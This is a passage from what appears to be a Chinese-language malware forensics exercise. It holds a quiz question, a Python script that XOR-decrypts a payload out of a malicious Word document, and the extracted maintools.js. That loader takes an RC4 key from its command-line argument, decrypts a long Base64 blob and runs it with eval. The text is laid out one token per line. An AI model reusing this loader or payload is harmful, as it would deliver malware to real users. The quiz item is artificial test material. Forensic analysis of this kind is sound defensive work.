+<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">.js</font>
+（通用）
+<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">.js</font>
+、
+<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">.wsh</font>
+、
+<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">.wsf</font>
+、ASP 内嵌
+语法兼容性
+遵循 ECMAScript 标准
+基础语法兼容，API、扩展、DOM 有大量私有差异
+特有扩展
+标准 BOM/DOM、ES 新特性
+微软私有对象：
+<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">ActiveXObject</font>
+、
+<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">WScript</font>
+、
+<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">ScriptEngine</font>
+等
+用途场景
+网页开发、前端、服务端、跨平台脚本
+Windows 本地脚本、老 IE 网页、系统脚本、恶意脚本常用
+现状
+主流、持续更新
+已废弃，仅存在于旧系统 / 电子取证 / 逆向分析场景
+43.接上题，分配给命令行参数的变量叫什么名字？【答案格式：abc3】
+先把maintools.js静态提出来
+from
+pathlib
+import
+Path
+# 恶意 Word 文档路径
+doc_path
+=
+Path
+(
+r"E:\oledump\49b367ac261a722a7c2bbbc328c32545"
+)
+# VBA 里用来定位加密块的标记
+marker
+=
+b"MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
+# VBA 里:
+# KDXl18qY4rcT = 16827
+# ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
+# => 实际长度 = 16828 字节
+payload_len
+=
+16828
+raw
+=
+doc_path
+.
+read_bytes
+(
+)
+idx
+=
+raw
+.
+find
+(
+marker
+)
+if
+idx
+==
+-
+1
+:
+raise
+SystemExit
+(
+"[-] 没找到 marker，路径不对或者样本不对"
+)
+print
+(
+f"[+] marker 偏移:
+{
+idx
+}
+"
+)
+# VBA:
+# Get #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
+#
+# VBA 的 Get 是 1-based 文件位置
+# 所以 Y + 81 对应 Python 0-based 偏移的 idx + 80
+start
+=
+idx
++
+80
+enc
+=
+bytearray
+(
+raw
+[
+start
+:
+start
++
+payload_len
+]
+)
+if
+len
+(
+enc
+)
+!=
+payload_len
+:
+raise
+SystemExit
+(
+f"[-] 截取长度不对，只拿到
+{
+len
+(
+enc
+)
+}
+字节"
+)
+# 对应 VBA 的 Q7JOhn5pIl648L6V43V
+key
+=
+45
+for
+i
+in
+range
+(
+payload_len
+)
+:
+enc
+[
+i
+]
+^
+=
+key
+    key
+=
+(
+(
+key
+^
+99
+)
+^
+(
+i
+%
+254
+)
+)
+&
+0xFF
+out
+=
+Path
+(
+"maintools.js"
+)
+out
+.
+write_bytes
+(
+enc
+)
+print
+(
+f"[+] 已导出:
+{
+out
+.
+resolve
+(
+)
+}
+"
+)
+print
+(
+"[+] 前 200 字节预览："
+)
+print
+(
+enc
+[
+:
+200
+]
+.
+decode
+(
+"latin1"
+,
+errors
+=
+"ignore"
+)
+)
+try
+{
+var
+wvy1
+=
+WScript
+.
+Arguments
+;
+var
+ssWZ
+=
+wvy1
+(
+0
+)
+;
+var
+ES3c
+=
+y3zb
+(
+)
+;
+ES3c
+=
+LXv5
+(
+ES3c
+)
+;
+ES3c
+=
+CpPT
+(
+ssWZ
+,
+ES3c
+)
+;
+eval
+(
+ES3c
+)
+;
+}
+catch
+(
+e
+)
+{
+WScript
+.
+Quit
+(
+)
+;
+}
+// Base64 字符映射
+function
+MTvK
+(
+CgqD
+)
+{
+var
+XwH7
+=
+CgqD
+.
+charCodeAt
+(
+0
+)
+;
+if
+(
+XwH7
+===
+0x2B
+||
+XwH7
+===
+0x2D
+)
+return
+62
+;
+if
+(
+XwH7
+===
+0x2F
+||
+XwH7
+===
+0x5F
+)
+return
+63
+;
+if
+(
+XwH7
+<
+0x30
+)
+return
+-
+1
+;
+if
+(
+XwH7
+<
+0x30
++
+10
+)
+return
+XwH7
+-
+0x30
++
+26
++
+26
+;
+if
+(
+XwH7
+<
+0x41
++
+26
+)
+return
+XwH7
+-
+0x41
+;
+if
+(
+XwH7
+<
+0x61
++
+26
+)
+return
+XwH7
+-
+0x61
++
+26
+;
+}
+// Base64 解码
+function
+LXv5
+(
+d27x
+)
+{
+var
+LUK7
+=
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+;
+var
+i
+;
+var
+j
+;
+var
+n6T8
+;
+if
+(
+d27x
+.
+length
+%
+4
+>
+0
+)
+return
+;
+var
+CHlB
+=
+d27x
+.
+length
+;
+var
+V8eR
+=
+d27x
+.
+charAt
+(
+CHlB
+-
+2
+)
+===
+'='
+?
+2
+:
+d27x
+.
+charAt
+(
+CHlB
+-
+1
+)
+===
+'='
+?
+1
+:
+0
+;
+var
+mjqo
+=
+new
+Array
+(
+d27x
+.
+length
+*
+3
+/
+4
+-
+V8eR
+)
+;
+var
+z8Ht
+=
+V8eR
+>
+0
+?
+d27x
+.
+length
+-
+4
+:
+d27x
+.
+length
+;
+var
+t2JG
+=
+0
+;
+function
+XGH6
+(
+b0tQ
+)
+{
+mjqo
+[
+t2JG
+++
+]
+=
+b0tQ
+;
+}
+for
+(
+i
+=
+0
+,
+j
+=
+0
+;
+i
+<
+z8Ht
+;
+i
++=
+4
+,
+j
++=
+3
+)
+{
+n6T8
+=
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
+)
+)
+<<
+18
+)
+|
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+1
+)
+)
+<<
+12
+)
+|
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+2
+)
+)
+<<
+6
+)
+|
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+3
+)
+)
+;
+XGH6
+(
+(
+n6T8
+&
+0xFF0000
+)
+>>
+16
+)
+;
+XGH6
+(
+(
+n6T8
+&
+0xFF00
+)
+>>
+8
+)
+;
+XGH6
+(
+n6T8
+&
+0xFF
+)
+;
+}
+if
+(
+V8eR
+===
+2
+)
+{
+n6T8
+=
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
+)
+)
+<<
+2
+)
+|
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+1
+)
+)
+>>
+4
+)
+;
+XGH6
+(
+n6T8
+&
+0xFF
+)
+;
+}
+else
+if
+(
+V8eR
+===
+1
+)
+{
+n6T8
+=
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
+)
+)
+<<
+10
+)
+|
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+1
+)
+)
+<<
+4
+)
+|
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+2
+)
+)
+>>
+2
+)
+;
+XGH6
+(
+(
+n6T8
+>>
+8
+)
+&
+0xFF
+)
+;
+XGH6
+(
+n6T8
+&
+0xFF
+)
+;
+}
+return
+mjqo
+;
+}
+// RC4 解密
+function
+CpPT
+(
+bOe3
+,
+F5vZ
+)
+{
+var
+AWy7
+=
+[
+]
+;
+var
+V2Vl
+=
+0
+;
+var
+qyCq
+;
+var
+mjqo
+=
+''
+;
+for
+(
+var
+i
+=
+0
+;
+i
+<
+256
+;
+i
+++
+)
+{
+AWy7
+[
+i
+]
+=
+i
+;
+}
+for
+(
+var
+i
+=
+0
+;
+i
+<
+256
+;
+i
+++
+)
+{
+V2Vl
+=
+(
+V2Vl
++
+AWy7
+[
+i
+]
++
+bOe3
+.
+charCodeAt
+(
+i
+%
+bOe3
+.
+length
+)
+)
+%
+256
+;
+qyCq
+=
+AWy7
+[
+i
+]
+;
+AWy7
+[
+i
+]
+=
+AWy7
+[
+V2Vl
+]
+;
+AWy7
+[
+V2Vl
+]
+=
+qyCq
+;
+}
+var
+i
+=
+0
+;
+var
+V2Vl
+=
+0
+;
+for
+(
+var
+y
+=
+0
+;
+y
+<
+F5vZ
+.
+length
+;
+y
+++
+)
+{
+i
+=
+(
+i
++
+1
+)
+%
+256
+;
+V2Vl
+=
+(
+V2Vl
++
+AWy7
+[
+i
+]
+)
+%
+256
+;
+qyCq
+=
+AWy7
+[
+i
+]
+;
+AWy7
+[
+i
+]
+=
+AWy7
+[
+V2Vl
+]
+;
+AWy7
+[
+V2Vl
+]
+=
+qyCq
+;
+mjqo
++=
+String
+.
+fromCharCode
+(
+F5vZ
+[
+y
+]
+^
+AWy7
+[
+(
+AWy7
+[
+i
+]
++
+AWy7
+[
+V2Vl
+]
+)
+%
+256
+]
+)
+;
+}
+return
+mjqo
+;
+}
+// 输出超长 Base64 字符串
+function
+y3zb
+(
+)
+{
+var
+qGxZ
+=
+"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